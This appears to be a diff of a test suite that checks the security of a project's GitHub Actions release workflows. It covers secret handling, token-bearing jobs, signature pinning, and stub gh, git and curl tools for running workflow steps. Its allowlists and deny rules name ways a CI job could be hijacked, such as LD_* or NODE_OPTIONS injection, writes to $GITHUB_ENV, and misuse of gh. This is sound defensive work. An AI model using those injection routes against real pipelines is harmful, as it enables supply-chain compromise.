@@ -35,7 +35,19 @@
  * with its install script, from the release as a local server serves it.
  * Where a step's script decides something, such as the environment or the
  * arguments the smoke gets, the check runs that script with bash, as the
- * runner does.
+ * runner does. No job hands a workflow it calls any secret: build.yml's keyed
+ * jobs take theirs from the environment they name.
+ *
+ * release.yml runs on pushes to main alone, one run at a time, none
+ * cancelled. Its release-please, assemble and publish jobs are the only jobs
+ * that read the Release Bot's key, in the release-bot environment. Each makes
+ * the bot's token, which every gh command gets in place of the workflow's own
+ * token, and they run nothing but the actions, gh, git, curl and release
+ * scripts they need. It builds the commit release-please's draft points at,
+ * in the release environment, attests the assembled files in a job of its
+ * own, uploads them only to a draft, and publishes once assemble and smoke
+ * have passed. Candidate and release builds compare the macOS designated
+ * requirement with the pinned one.
  *
  * Node has no YAML parser and the repo takes no dependency for a test, so the
  * workflows are parsed by Python's PyYAML, as in check-github-config.test.mjs.
@@ -55,7 +67,7 @@ import { isDeepStrictEqual } from "node:util";
 
 import { compiledFiles } from "../release/compiled-tar.mjs";
 import { dryRunConfig } from "../release/dry-run-config.mjs";
-import { INSTALL_SCRIPTS, TARGETS, UPDATER_KEY_ID, unsignedAssets, updaterAssets } from "../release/release-assets.mjs";
+import { INSTALL_SCRIPTS, TARGETS, UPDATER_KEY_ID, expectedAssets, unsignedAssets, updaterAssets } from "../release/release-assets.mjs";
 
 const ROOT = fileURLToPath(new URL("../../", import.meta.url));
 const WORKFLOWS = ".github/workflows";
@@ -547,6 +559,14 @@ describe("PR titles", () => {
 
 const BUILD = `${WORKFLOWS}/build.yml`;
 const DRY_RUN = `${WORKFLOWS}/release-dry-run.yml`;
+const RELEASE = `${WORKFLOWS}/release.yml`;
+
+/**
+ * The macOS designated requirement of the release identity, pinned: a
+ * candidate's and a release's macOS checks compare the app's with it. A dry
+ * run signs with an identity made for the run, so it checks the shape only.
+ */
+const DR_FILE = "scripts/release/macos-designated-requirement.txt";
 
 /**
  * The workflows a release is made by. Their actions run next to the signing
@@ -711,6 +731,16 @@ describe("release workflows", () => {
       .filter(({ workflow: flow }) => Object.hasOwn(triggersOf(flow), "pull_request_target"))
       .map(({ rel }) => rel);
     assert.deepEqual(found, [], `these workflows run on pull_request_target; use pull_request: ${found.join(", ")}`);
+  });
+
+  yamlTest("no job hands a workflow it calls any secret, secrets: inherit least of all", () => {
+    // inherit would give every job of build.yml, compile's included, the
+    // repository's secrets; its keyed jobs take theirs from the environment
+    // they name.
+    const calls = workflowJobs().filter(({ job }) => typeof job.uses === "string");
+    assert.ok(calls.length > 0, "no job calls a workflow, so there was nothing to check");
+    const found = calls.filter(({ job }) => job.secrets !== undefined).map(({ rel, id, job }) => `${rel}, job ${id}: secrets: ${JSON.stringify(job.secrets)}`);
+    assert.deepEqual(found, [], found.join("\n"));
   });
 
   yamlTest("the release workflows grant only contents: read at the top, and more per job only", () => {
@@ -1035,6 +1065,31 @@ const KEYED_TOOLS = new Map([
 ]);
 
 /**
+ * What a simple command's assignments and redirections do that a job with a
+ * key may not: set a variable a tool reads (PATH, GIT_*, LD_*, NODE_OPTIONS,
+ * …), as only lower-case names and those `allowed` may be set; write under
+ * node_modules, scripts or src-tauri, or to $GITHUB_ENV or $GITHUB_PATH,
+ * which set later steps' environment, the steps of actions included; or use
+ * a here-document, which simpleCommands doesn't read.
+ *
+ * @param {{ name: string }[]} assignments
+ * @param {{ op: string, target: string }[]} redirects
+ * @param {string[]} allowed  the names besides lower-case ones that may be set
+ * @returns {string[]}
+ */
+function settingProblems(assignments, redirects, allowed) {
+  const problems = [];
+  for (const assignment of assignments) {
+    if (!/^[a-z_][a-z0-9_]*$/.test(assignment.name) && !allowed.includes(assignment.name)) problems.push(`sets ${assignment.name}, which a tool can read`);
+  }
+  for (const { op, target } of redirects) {
+    if (op === "<<" || op === "<<-") problems.push("uses a here-document, which this check doesn't read");
+    else if (WRITES.has(op) && (PROTECTED_PATH.test(target) || /^\$\{?GITHUB_(ENV|PATH)\}?$/.test(target))) problems.push(`writes to ${target}`);
+  }
+  return problems;
+}
+
+/**
  * Why a simple command may not run in a job with the keys: none, when it may.
  * Only these may run: the lockfile's Tauri CLI, to bundle with the flags the
  * workflow passes or to sign; npm ci --ignore-scripts; node on
@@ -1050,14 +1105,7 @@ const KEYED_TOOLS = new Map([
  * @returns {string[]}
  */
 function keyedProblems({ words: [name, ...args], assignments, redirects }, functions) {
-  const problems = [];
-  for (const assignment of assignments) {
-    if (!/^[a-z_][a-z0-9_]*$/.test(assignment.name) && !["IFS", "LC_ALL", "P12"].includes(assignment.name)) problems.push(`sets ${assignment.name}, which a tool can read`);
-  }
-  for (const { op, target } of redirects) {
-    if (op === "<<" || op === "<<-") problems.push("uses a here-document, which this check doesn't read");
-    else if (WRITES.has(op) && (PROTECTED_PATH.test(target) || /^\$\{?GITHUB_(ENV|PATH)\}?$/.test(target))) problems.push(`writes to ${target}`);
-  }
+  const problems = settingProblems(assignments, redirects, ["IFS", "LC_ALL", "P12"]);
   if (name === undefined) return problems;
   let why = null;
   if (name === "npx") {
@@ -1771,13 +1819,23 @@ capture() {
     assert.deepEqual(sudo.map((line) => line.trim().split(" ").slice(0, 3).join(" ")), ["sudo security add-trusted-cert"], "macos-keychain.sh runs another sudo command");
   });
 
-  yamlTest("bundle-macos checks the app's signature with macos-signature.mjs in every build, before it collects the bundles", () => {
+  yamlTest("bundle-macos checks the app's signature with macos-signature.mjs in every build, a release build's against the pinned designated requirement, before it collects the bundles", () => {
+    // A dry run signs with an identity made for the run, whose designated
+    // requirement no file can pin, so it checks the shape only.
     const steps = stepsOf("bundle-macos");
-    const check = steps.findIndex((step) => commandLines(step).includes('node scripts/release/macos-signature.mjs "target/$TRIPLE/release/bundle/macos/Fleetify.app"'));
-    assert.ok(check !== -1, "bundle-macos doesn't check the app's signature");
-    assert.equal(steps[check].if, undefined, "the signature check must run in release builds and dry runs alike");
-    assert.ok(check > steps.findLastIndex(isTauriBundle), "the signature is checked before the app is bundled");
-    assert.ok(check < steps.findIndex((step) => scriptOf(step).includes("collect-bundles.mjs")), "the bundles are collected before the signature is checked");
+    const checks = steps.filter((step) => scriptOf(step).includes("macos-signature.mjs"));
+    const release = checks.filter((step) => requires(step.if, RELEASE_ONLY));
+    const dryRun = checks.filter((step) => requires(step.if, DRY_RUN_ONLY));
+    assert.deepEqual([checks.length, release.length, dryRun.length], [2, 1, 1], `bundle-macos must check the signature once if "${RELEASE_ONLY}" and once if "${DRY_RUN_ONLY}"`);
+    const check = 'node scripts/release/macos-signature.mjs "target/$TRIPLE/release/bundle/macos/Fleetify.app"';
+    assert.deepEqual(commandLines(release[0]), [`${check} --expected-dr ${DR_FILE}`], `${release[0].name} doesn't compare the designated requirement with ${DR_FILE}`);
+    assert.deepEqual(commandLines(dryRun[0]), [check], `${dryRun[0].name}`);
+    assert.ok(existsSync(join(ROOT, DR_FILE)), `${DR_FILE} is missing`);
+    for (const step of checks) {
+      const at = steps.indexOf(step);
+      assert.ok(at > steps.findLastIndex(isTauriBundle), `${step.name}: the signature is checked before the app is bundled`);
+      assert.ok(at < steps.findIndex((candidate) => scriptOf(candidate).includes("collect-bundles.mjs")), `${step.name}: the bundles are collected before the signature is checked`);
+    }
   });
 
   yamlTest("scan-secrets.mjs scans the UI and the binaries in every compile leg, after the app is built", () => {
@@ -1983,7 +2041,7 @@ describe("release-dry-run.yml", () => {
     });
   });
 
-  scriptTest("meta skips release commits, picks the environment and signs with the release keys only from main", () => {
+  scriptTest("meta skips release commits, picks the environment, signs with the release keys only from main, and pins a candidate's designated requirement", () => {
     const meta = jobOf(DRY_RUN, "meta");
     assert.equal(
       String(meta.if).replace(/\s+/g, " ").trim(),
@@ -1992,7 +2050,11 @@ describe("release-dry-run.yml", () => {
     const step = (meta.steps ?? []).find((candidate) => candidate.id === "meta");
     assert.ok(step, "meta has no step with id meta");
     assert.equal(step.env?.SIGNING, "${{ inputs.signing }}");
-    assert.deepEqual(meta.outputs, { version: "${{ steps.meta.outputs.version }}", environment: "${{ steps.meta.outputs.environment }}" });
+    assert.deepEqual(meta.outputs, {
+      version: "${{ steps.meta.outputs.version }}",
+      environment: "${{ steps.meta.outputs.environment }}",
+      "expected-dr": "${{ steps.meta.outputs.expected-dr }}",
+    });
     inTempDir((dir) => {
       writeFileSync(join(dir, "package.json"), `${JSON.stringify({ version: "1.2.3" })}\n`);
       const run = (signing, ref) => {
@@ -2001,14 +2063,16 @@ describe("release-dry-run.yml", () => {
         const result = runScript(step.run, { cwd: dir, env: { SIGNING: signing, GITHUB_REF: ref, GITHUB_OUTPUT: output } });
         return { status: result.status, output: readFileSync(output, "utf8"), log: `${result.stdout}${result.stderr}` };
       };
-      for (const [signing, ref, environment] of [
-        ["", "refs/heads/main", "dry-run"],
-        ["ephemeral", "refs/pull/7/merge", "dry-run"],
-        ["release", "refs/heads/main", "release"],
+      // A candidate is signed with the release identity, whose designated
+      // requirement is pinned; a dry run's identity is made for the run.
+      for (const [signing, ref, environment, dr] of [
+        ["", "refs/heads/main", "dry-run", ""],
+        ["ephemeral", "refs/pull/7/merge", "dry-run", ""],
+        ["release", "refs/heads/main", "release", DR_FILE],
       ]) {
         const result = run(signing, ref);
         assert.equal(result.status, 0, `signing "${signing}" on ${ref}:\n${result.log}`);
-        assert.equal(result.output, `version=1.2.3\nenvironment=${environment}\n`, `signing "${signing}" on ${ref}`);
+        assert.equal(result.output, `version=1.2.3\nenvironment=${environment}\nexpected-dr=${dr}\n`, `signing "${signing}" on ${ref}`);
       }
       const offMain = run("release", "refs/heads/feature");
       assert.notEqual(offMain.status, 0, "signing: release off main must fail");
@@ -2038,33 +2102,47 @@ describe("release-dry-run.yml", () => {
     assert.doesNotMatch(scriptOf(release[0]), /--per-target-pubkeys/);
   });
 
-  yamlTest("assemble adds the install scripts from scripts/release, in both environments", () => {
+  yamlTest("each assemble adds the install scripts from scripts/release: the dry run's in both environments, and the release's", () => {
     // No build makes them; assemble.mjs refuses a release without them.
-    const runs = (jobOf(DRY_RUN, "assemble").steps ?? []).filter((step) => scriptOf(step).includes("assemble.mjs"));
-    assert.equal(runs.length, 2);
-    for (const step of runs) {
-      const extras = [...scriptOf(step).matchAll(/(?:^|\s)--extra\s+(\S+)/g)].map(([, path]) => path);
-      assert.deepEqual(extras, INSTALL_SCRIPTS.map((name) => `scripts/release/${name}`), step.name);
+    for (const [rel, count] of [
+      [DRY_RUN, 2],
+      [RELEASE, 1],
+    ]) {
+      const runs = (jobOf(rel, "assemble").steps ?? []).filter((step) => scriptOf(step).includes("assemble.mjs"));
+      assert.equal(runs.length, count, `${rel}'s assemble job must run assemble.mjs ${count} time(s)`);
+      for (const step of runs) {
+        const extras = [...scriptOf(step).matchAll(/(?:^|\s)--extra\s+(\S+)/g)].map(([, path]) => path);
+        assert.deepEqual(extras, INSTALL_SCRIPTS.map((name) => `scripts/release/${name}`), `${rel}: ${step.name}`);
+      }
+      // The job checks out scripts/release, which holds them.
+      const checkout = (jobOf(rel, "assemble").steps ?? []).find((step) => usesAction(step, "actions/checkout"));
+      assert.ok(String(checkout?.with?.["sparse-checkout"]).split("\n").includes("scripts/release"), `${rel}'s assemble doesn't check out scripts/release`);
     }
-    // The job checks out scripts/release, which holds them.
-    assert.ok(String(jobOf(DRY_RUN, "assemble").steps?.[0]?.with?.["sparse-checkout"]).split("\n").includes("scripts/release"));
   });
 
-  yamlTest("assemble downloads only the bundles and the notices", () => {
-    // assemble.mjs refuses any other folder in --in.
-    const steps = jobOf(DRY_RUN, "assemble").steps ?? [];
-    const downloads = steps
-      .filter((step) => usesAction(step, "actions/download-artifact"))
-      .map((step) => ({ what: step.with?.name ?? step.with?.pattern ?? "every artifact", path: step.with?.path, merge: step.with?.["merge-multiple"] ?? false }));
-    assert.deepEqual(downloads.sort((a, b) => (a.what < b.what ? -1 : 1)), [
-      { what: "bundles-*", path: "artifacts", merge: false },
-      { what: "third-party-notices", path: "artifacts/third-party-notices", merge: false },
-    ]);
-    const upload = steps.find((step) => usesAction(step, "actions/upload-artifact"));
-    assert.deepEqual(
-      [upload?.with?.name, upload?.with?.path, upload?.with?.["if-no-files-found"], upload?.with?.["retention-days"]],
-      ["release", "release", "error", 14],
-    );
+  yamlTest("each assemble downloads only the bundles and the notices, and uploads the release for the smoke", () => {
+    // assemble.mjs refuses any other folder in --in. A candidate's release is
+    // kept for the RC checks; a release's files are on GitHub, and its
+    // artifact serves only the smoke, so it is kept as long as the builds'.
+    for (const [rel, retention] of [
+      [DRY_RUN, 14],
+      [RELEASE, 7],
+    ]) {
+      const steps = jobOf(rel, "assemble").steps ?? [];
+      const downloads = steps
+        .filter((step) => usesAction(step, "actions/download-artifact"))
+        .map((step) => ({ what: step.with?.name ?? step.with?.pattern ?? "every artifact", path: step.with?.path, merge: step.with?.["merge-multiple"] ?? false }));
+      assert.deepEqual(downloads.sort((a, b) => (a.what < b.what ? -1 : 1)), [
+        { what: "bundles-*", path: "artifacts", merge: false },
+        { what: "third-party-notices", path: "artifacts/third-party-notices", merge: false },
+      ], `${rel}'s downloads`);
+      const uploads = steps.filter((step) => usesAction(step, "actions/upload-artifact"));
+      assert.deepEqual(
+        uploads.map((step) => [step.with?.name, step.with?.path, step.with?.["if-no-files-found"], step.with?.["retention-days"]]),
+        [["release", "release", "error", retention]],
+        `${rel}'s upload`,
+      );
+    }
   });
 });
 
@@ -2572,12 +2650,665 @@ describe("smoke.yml's install via script", () => {
 });
 
 describe("release-dry-run.yml's smoke", () => {
-  yamlTest("it smoke-tests the assembled release, rehearsing updates only with a dry-run build", () => {
-    // Only a dry-run build's updater asks the smoke's update server.
+  yamlTest("it smoke-tests the assembled release, rehearsing updates only with a dry-run build, and a candidate against the pinned designated requirement", () => {
+    // Only a dry-run build's updater asks the smoke's update server; meta
+    // names the pinned requirement for a candidate alone.
     const smoke = jobOf(DRY_RUN, "smoke");
     assert.equal(smoke.uses, "./.github/workflows/smoke.yml");
     assert.deepEqual([smoke.needs].flat().sort(), ["assemble", "meta"]);
-    assert.deepEqual(smoke.with, { version: "${{ needs.meta.outputs.version }}", rehearse: "${{ needs.meta.outputs.environment == 'dry-run' }}" });
+    assert.deepEqual(smoke.with, {
+      version: "${{ needs.meta.outputs.version }}",
+      rehearse: "${{ needs.meta.outputs.environment == 'dry-run' }}",
+      "expected-dr": "${{ needs.meta.outputs.expected-dr }}",
+    });
+  });
+});
+
+// ── release.yml ─────────────────────────────────────────────────────────────
+
+/** release.yml's jobs that read the Release Bot's key: they name the release-bot environment, which holds it. */
+const RELEASE_BOT_JOBS = ["release-please", "assemble", "publish"];
+
+/** The Release Bot's private key, a secret of the release-bot environment. */
+const RELEASE_BOT_KEY = "RELEASE_BOT_PRIVATE_KEY";
+
+/** An output of release.yml's release-please job, as a later job reads it. */
+const fromReleasePlease = (name) => `\${{ needs.release-please.outputs.${name} }}`;
+
+/** A release.yml job's steps. */
+const releaseStepsOf = (id) => jobOf(RELEASE, id).steps ?? [];
+
+/** The steps of a release.yml job that make the Release Bot's token. */
+const tokenStepsOf = (id) => releaseStepsOf(id).filter((step) => usesAction(step, "actions/create-github-app-token"));
+
+/** A token step's inputs: the App's client ID, a variable; its key, a secret; and write access to `permissions`. */
+const tokenInputs = (permissions) => ({
+  "client-id": "${{ vars.RELEASE_BOT_CLIENT_ID }}",
+  "private-key": `\${{ secrets.${RELEASE_BOT_KEY} }}`,
+  ...Object.fromEntries(permissions.map((name) => [`permission-${name}`, "write"])),
+});
+
+/** Whether a step's script runs gh. */
+const runsGh = (step) => simpleCommands(scriptOf(step)).some(({ words }) => words[0] === "gh");
+
+/** The one step of a release.yml job whose script holds `text`. */
+function releaseStep(id, text) {
+  const steps = releaseStepsOf(id).filter((step) => scriptOf(step).includes(text));
+  assert.equal(steps.length, 1, `release.yml's job ${id} must have one step that runs ${text}`);
+  return steps[0];
+}
+
+/** The actions each job with the Release Bot's key may run (another test checks each is pinned to a commit). */
+const RELEASE_BOT_ACTIONS = {
+  "release-please": ["actions/create-github-app-token", "googleapis/release-please-action"],
+  assemble: ["actions/attest-build-provenance", "actions/checkout", "actions/create-github-app-token", "actions/download-artifact", "actions/setup-node", "actions/upload-artifact"],
+  publish: ["actions/create-github-app-token"],
+};
+
+/**
+ * A rule for gh's arguments in those jobs: gh release view reads a release
+ * of the repository GH_REPO names; the two writes are the workflow's own,
+ * each in its one form. The token can write the repository's contents, so
+ * nothing else, such as gh release delete or gh api, may run.
+ */
+function ghRule(args) {
+  if (args[0] === "release" && args[1] === "view") {
+    return args.some((arg) => /^(-R|--repo)(=|$)/.test(arg)) ? "must take the repository from GH_REPO" : null;
+  }
+  const writes = [
+    ["release", "upload", "$TAG", "release/*", "--clobber"],
+    ["release", "edit", "$TAG", "--draft=false", "--latest"],
+  ];
+  if (writes.some((form) => sameWords(form, args))) return null;
+  return `may only view a release, or run ${writes.map((form) => `gh ${form.join(" ")}`).join(" or ")}`;
+}
+
+/** The commands those jobs may run, besides node on the release scripts, each with a rule for its arguments. */
+const RELEASE_BOT_TOOLS = new Map([
+  ["[", anything],
+  ["curl", exactly(["-fsSL", "$url"])],
+  ["echo", anything],
+  ["exit", anything],
+  ["gh", ghRule],
+  ["git", exactly(["ls-remote", "--tags", "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY", "refs/tags/$TAG"])],
+  ["jq", exactly(["-r", ".version"])],
+  ["printf", anything],
+  ["sleep", exactly(["10"])],
+  ["sort", exactly([])],
+]);
+
+/**
+ * Why a simple command may not run in a job with the Release Bot's key: none,
+ * when it may. Only node on a scripts/release/*.mjs file and the tools above
+ * may run, with the arguments their rules allow, and settingProblems' rules
+ * hold, with LC_ALL the one upper-case name a command may set.
+ *
+ * @param {{ words: string[], assignments: { name: string }[], redirects: { op: string, target: string }[] }} command
+ * @returns {string[]}
+ */
+function releaseBotProblems({ words: [name, ...args], assignments, redirects }) {
+  const problems = settingProblems(assignments, redirects, ["LC_ALL"]);
+  if (name === undefined) return problems;
+  let why = null;
+  if (name === "node") {
+    if (!/^scripts\/release\/[\w-]+\.mjs$/.test(args[0] ?? "")) why = "runs node on something other than a scripts/release/*.mjs file";
+  } else if (/[/$`]/.test(name)) why = "runs a file by its path, or a command named by a variable";
+  else if (!RELEASE_BOT_TOOLS.has(name)) why = `runs ${name}, which isn't among the commands these jobs may run`;
+  else {
+    const rule = RELEASE_BOT_TOOLS.get(name)(args);
+    if (rule !== null) why = `runs ${name}, which ${rule}`;
+  }
+  if (why !== null) problems.push(why);
+  return problems;
+}
+
+const JQ_SKIP = spawnSync("jq", ["--version"], { stdio: "ignore" }).status === 0 ? false : "jq is needed: release.yml's publish job reads latest.json with it, and the stand-in gh answers --jq with it";
+
+/** A test that parses YAML and runs a step's script with jq at hand, skipped (with the reason) where any of them is missing. */
+const jqScriptTest = (name, fn) => test(name, { skip: YAML_SKIP || BASH_SKIP || JQ_SKIP }, fn);
+
+/**
+ * gh, as the tests of release.yml's steps fake it. It logs its arguments.
+ * gh release view answers with jq, as its --jq does, from a JSON file: the
+ * release STUB_TAG names, from STUB_RELEASE, or with no tag, the latest
+ * release, from STUB_LATEST. gh release upload and edit only log. Another
+ * release, or another command, fails.
+ */
+const FAKE_GH = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.gh\"",
+  '[ "$1" = release ] || exit 3',
+  "sub=$2",
+  "shift 2",
+  "case $sub in",
+  "  view)",
+  "    file=$STUB_LATEST",
+  "    case $1 in",
+  "      -*) ;;",
+  '      *) [ "$1" = "$STUB_TAG" ] || { echo "release not found" >&2; exit 1; }; file=$STUB_RELEASE; shift ;;',
+  "    esac",
+  "    expr=",
+  "    while [ $# -gt 0 ]; do",
+  '      case $1 in --json) shift 2 ;; --jq) expr=$2; shift 2 ;; *) echo "unexpected $1" >&2; exit 3 ;; esac',
+  "    done",
+  '    jq -r "$expr" "$file" ;;',
+  "  upload | edit)",
+  '    [ "$1" = "$STUB_TAG" ] || { echo "release not found" >&2; exit 1; } ;;',
+  "  *) exit 3 ;;",
+  "esac",
+  "",
+].join("\n");
+
+/** git, faked: it logs its arguments, and git ls-remote prints STUB_LS_REMOTE, a line or nothing. */
+const FAKE_GIT = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.git\"",
+  '[ "$1" = ls-remote ] || exit 3',
+  "if [ -n \"$STUB_LS_REMOTE\" ]; then printf '%s\\n' \"$STUB_LS_REMOTE\"; fi",
+  "",
+].join("\n");
+
+/**
+ * curl, faked: it logs its arguments, and its nth call prints STUB_SERVED/n,
+ * or STUB_SERVED/last once there is no such file; a file that says
+ * "HTTP 404" fails as curl -f fails on that status.
+ */
+const FAKE_CURL = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.curl\"",
+  'n=$(wc -l < "$STUB_LOG.curl" | tr -d " ")',
+  'file="$STUB_SERVED/$n"',
+  '[ -f "$file" ] || file="$STUB_SERVED/last"',
+  'if [ "$(cat "$file")" = "HTTP 404" ]; then echo "curl: (22) The requested URL returned error: 404" >&2; exit 22; fi',
+  'cat "$file"',
+  "",
+].join("\n");
+
+/** sleep, faked: it logs its argument and returns at once. */
+const FAKE_SLEEP = "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$STUB_LOG.sleep\"\n";
+
+/**
+ * Run a step of release.yml as the runner runs it (bash -eo pipefail), with
+ * `env`, in a temporary folder that holds scripts/release/release-assets.mjs
+ * and a release/ folder with `files`. node and jq are the real ones; gh, git,
+ * curl and sleep are FAKE_GH, FAKE_GIT, FAKE_CURL and FAKE_SLEEP. `release`
+ * and `latest` are what gh release view shows of the release `tag` names and
+ * of the latest release; `served` holds what curl's calls print in turn, a
+ * null for a 404. Returns { status, output, gh, git, curl, sleep }, the last
+ * four the lines each stand-in logged.
+ */
+function runReleaseStep(step, { env = {}, files = [], release, latest, tag = "v1.2.3", served = [] } = {}) {
+  return inTempDir((dir) => {
+    const bin = join(dir, "bin");
+    for (const sub of ["bin", "release", "served", "scripts/release"]) mkdirSync(join(dir, sub), { recursive: true });
+    copyFileSync(join(ROOT, "scripts/release/release-assets.mjs"), join(dir, "scripts/release/release-assets.mjs"));
+    for (const name of files) writeFileSync(join(dir, "release", name), `${name}\n`);
+    for (const [name, value] of [["release.json", release], ["latest-release.json", latest]]) {
+      if (value !== undefined) writeFileSync(join(dir, name), JSON.stringify(value));
+    }
+    served.forEach((body, i) => writeFileSync(join(dir, "served", String(i + 1)), body ?? "HTTP 404"));
+    if (served.length > 0) writeFileSync(join(dir, "served", "last"), served.at(-1) ?? "HTTP 404");
+    for (const [name, text] of [
+      ["gh", FAKE_GH],
+      ["git", FAKE_GIT],
+      ["curl", FAKE_CURL],
+      ["sleep", FAKE_SLEEP],
+      ["node", `#!/bin/sh\nexec "${process.execPath}" "$@"\n`],
+    ]) {
+      writeFileSync(join(bin, name), text, { mode: 0o755 });
+    }
+    const log = join(dir, "stub");
+    const result = spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", step.run], {
+      cwd: dir,
+      env: {
+        PATH: `${bin}:${process.env.PATH}`,
+        HOME: process.env.HOME,
+        STUB_LOG: log,
+        STUB_TAG: tag,
+        STUB_RELEASE: join(dir, "release.json"),
+        STUB_LATEST: join(dir, "latest-release.json"),
+        STUB_SERVED: join(dir, "served"),
+        GH_TOKEN: "the Release Bot's token",
+        GH_REPO: "fleetifydev/fleetify",
+        ...env,
+      },
+      encoding: "utf8",
+      timeout: 60_000,
+    });
+    const logged = (name) => (existsSync(`${log}.${name}`) ? readFileSync(`${log}.${name}`, "utf8").split("\n").filter(Boolean) : []);
+    return { status: result.status, output: `${result.stdout}${result.stderr}`, gh: logged("gh"), git: logged("git"), curl: logged("curl"), sleep: logged("sleep") };
+  });
+}
+
+/** A commit id, as release-please's sha output gives the draft's. */
+const DRAFT_COMMIT = "0123456789abcdef0123456789abcdef01234567";
+
+/** What each of release.yml's step tests runs with: the draft of version 1.2.3, at DRAFT_COMMIT. */
+const RELEASE_ENV = {
+  TAG: "v1.2.3",
+  VERSION: "1.2.3",
+  SHA: DRAFT_COMMIT,
+  GITHUB_SERVER_URL: "https://github.com",
+  GITHUB_REPOSITORY: "fleetifydev/fleetify",
+};
+
+describe("release.yml", () => {
+  yamlTest("it runs on pushes to main alone, one run at a time, none cancelled, in five jobs, with bash", () => {
+    const flow = workflow(RELEASE);
+    assert.deepEqual(triggersOf(flow), { push: { branches: ["main"] } });
+    // A run waits for the one before it to end, so release-please never runs
+    // while a draft is pending, and a release that started is never cut short.
+    assert.deepEqual(flow.concurrency, { group: "release", "cancel-in-progress": false });
+    assert.deepEqual(Object.keys(flow.jobs ?? {}).sort(), ["assemble", "build", "publish", "release-please", "smoke"]);
+    // bash -eo pipefail: a pipe whose first command fails, fails.
+    assert.equal(flow.defaults?.run?.shell, "bash", "release.yml's steps must run with bash");
+  });
+
+  yamlTest("release-please runs with the Release Bot's token, and hands on the draft's tag, version and commit", () => {
+    // Events made with the App's token start workflows, unlike the job's own
+    // token's, so the release pull request gets its checks.
+    const job = jobOf(RELEASE, "release-please");
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    const steps = releaseStepsOf("release-please");
+    const [token] = tokenStepsOf("release-please");
+    const runs = steps.filter((step) => usesAction(step, "googleapis/release-please-action"));
+    assert.equal(runs.length, 1, "release-please must run release-please-action once");
+    const [run] = runs;
+    assert.ok(token !== undefined && steps.indexOf(token) < steps.indexOf(run), "release-please must make the Release Bot's token before it runs release-please");
+    assert.equal(typeof run.id, "string", "the release-please step needs an id");
+    assert.deepEqual(run.with, { token: `\${{ steps.${token.id}.outputs.token }}`, "config-file": "release-please-config.json", "manifest-file": ".release-please-manifest.json" });
+    for (const file of [run.with["config-file"], run.with["manifest-file"]]) assert.ok(existsSync(join(ROOT, file)), `${file} is missing`);
+    assert.deepEqual(job.outputs, Object.fromEntries(["release_created", "tag_name", "version", "sha"].map((name) => [name, `\${{ steps.${run.id}.outputs.${name} }}`])));
+  });
+
+  scriptTest("release-please's check passes a draft tagged v<version> at a commit, and fails another tag, or anything but a commit", () => {
+    // latest.json's download URLs look for the files under v<version>, and
+    // build.yml checks out the commit, where a branch could move on before
+    // the tag is made.
+    const steps = releaseStepsOf("release-please");
+    const run = steps.find((step) => usesAction(step, "googleapis/release-please-action"));
+    const checks = steps.filter((step) => scriptOf(step) !== "");
+    assert.equal(checks.length, 1, "release-please must check what release-please made, once");
+    const [check] = checks;
+    assert.ok(steps.indexOf(check) > steps.indexOf(run));
+    assert.equal(String(check.if).replace(/\s+/g, " ").trim(), `steps.${run.id}.outputs.release_created == 'true'`);
+    assert.deepEqual(check.env, Object.fromEntries([["TAG", "tag_name"], ["VERSION", "version"], ["SHA", "sha"]].map(([name, output]) => [name, `\${{ steps.${run.id}.outputs.${output} }}`])));
+    inTempDir((dir) => {
+      const status = (env) => runScript(check.run, { cwd: dir, env }).status;
+      assert.equal(status({ TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT }), 0);
+      for (const env of [
+        { TAG: "1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "fleetify-v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "v1.2.4", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: "main" },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: "" },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT.slice(0, 39) },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: `${DRAFT_COMMIT}0` },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT.toUpperCase() },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: `${DRAFT_COMMIT.slice(0, 39)}g` },
+      ]) {
+        assert.equal(status(env), 1, JSON.stringify(env));
+      }
+    });
+  });
+
+  yamlTest("build runs build.yml on the draft's commit, whose tag doesn't exist yet, in the release environment, once release-please has made a release", () => {
+    const build = jobOf(RELEASE, "build");
+    assert.equal(build.uses, "./.github/workflows/build.yml");
+    assert.deepEqual([build.needs].flat(), ["release-please"]);
+    assert.equal(String(build.if).replace(/\s+/g, " ").trim(), "needs.release-please.outputs.release_created == 'true'");
+    assert.deepEqual(build.with, { ref: fromReleasePlease("sha"), environment: "release", version: fromReleasePlease("version") });
+  });
+
+  yamlTest("assemble checks every signature against the shipped release key, with the release scripts of the draft's commit", () => {
+    const job = jobOf(RELEASE, "assemble");
+    assert.deepEqual([job.needs].flat().sort(), ["build", "release-please"]);
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    assert.deepEqual(job.env, { TAG: fromReleasePlease("tag_name"), VERSION: fromReleasePlease("version"), GH_REPO: "${{ github.repository }}" });
+    const checkouts = releaseStepsOf("assemble").filter((step) => usesAction(step, "actions/checkout"));
+    assert.equal(checkouts.length, 1, "assemble must check out once");
+    assert.deepEqual(checkouts[0].with, {
+      ref: fromReleasePlease("sha"),
+      "sparse-checkout": ".nvmrc\nscripts/release\nsrc-tauri/tauri.conf.json\n",
+      "sparse-checkout-cone-mode": false,
+      "persist-credentials": false,
+    });
+    const step = releaseStep("assemble", "assemble.mjs");
+    assert.equal(step.if, undefined);
+    assert.match(scriptOf(step), new RegExp(`^node scripts/release/assemble\\.mjs --in artifacts --out release --version "\\$VERSION" --pubkey-config src-tauri/tauri\\.conf\\.json --expect-key-id ${UPDATER_KEY_ID}\\s`));
+    assert.doesNotMatch(scriptOf(step), /--per-target-pubkeys/);
+  });
+
